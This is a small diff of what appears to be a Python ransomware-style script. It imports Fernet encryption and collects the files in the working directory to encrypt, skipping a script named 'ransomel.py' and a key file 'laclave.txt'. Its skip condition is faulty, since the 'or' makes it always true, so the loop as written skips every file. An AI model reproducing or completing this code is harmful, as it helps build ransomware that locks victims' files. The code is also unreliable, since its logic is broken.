@@ -7,7 +7,7 @@ from cryptography.fernet import Fernet
 archivos = []
 
 for archivo in os.listdir():
-        if archivo == "ransito.py" or "laclave.txt":
+        if archivo == "ransomel.py" or "laclave.txt":
                 continue
         if os.path.isfile (archivo):
                 archivos.append(archivo)
